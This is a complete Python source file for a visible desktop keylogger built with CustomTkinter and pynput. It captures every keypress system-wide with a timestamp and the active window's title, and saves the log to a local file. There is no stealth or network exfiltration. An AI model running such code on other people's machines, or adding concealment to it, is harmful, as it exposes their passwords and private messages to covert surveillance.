import customtkinter as ctk
from pynput import keyboard
import threading
import tkinter.messagebox as mb
import datetime
import pygetwindow as gw

ctk.set_appearance_mode("Dark") 
ctk.set_default_color_theme("blue")

class KeyloggerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Local Keylogger with CustomTkinter")
        self.geometry("600x400")

        self.is_listening = False
        self.log = ""

        self.textbox = ctk.CTkTextbox(self, width=580, height=300)
        self.textbox.pack(pady=20)

        self.btn_frame = ctk.CTkFrame(self)
        self.btn_frame.pack(pady=10)

        self.start_btn = ctk.CTkButton(self.btn_frame, text="Start Logging", command=self.start_listening)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = ctk.CTkButton(self.btn_frame, text="Stop Logging", command=self.stop_listening, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=10)

        self.save_btn = ctk.CTkButton(self.btn_frame, text="Save Log", command=self.save_log)
        self.save_btn.grid(row=0, column=2, padx=10)

        self.listener = None

    def on_press(self, key):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            char = key.char
        except AttributeError:
            char = f"[{key.name}]"

        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown"
        except Exception:
            window_title = "Unknown"

        log_entry = f"{timestamp} | {window_title} | {char}\n"
        self.log += log_entry
        self.update_textbox()

    def update_textbox(self):
        self.textbox.delete("0.0", "end")
        self.textbox.insert("0.0", self.log)

    def start_listening(self):
        if not self.is_listening:
            self.is_listening = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.start_btn.configure(state="disabled")
            self.stop_btn.configure(state="normal")

    def stop_listening(self):
        if self.is_listening:
            self.is_listening = False
            self.listener.stop()
            self.start_btn.configure(state="normal")
            self.stop_btn.configure(state="disabled")

    def save_log(self):
        with open("keylog.txt", "w", encoding="utf-8") as f:
            f.write(self.log)
        mb.showinfo(title="Saved", message="Log saved to keylog.txt")

if __name__ == "__main__":
    app = KeyloggerApp()
    app.mainloop()
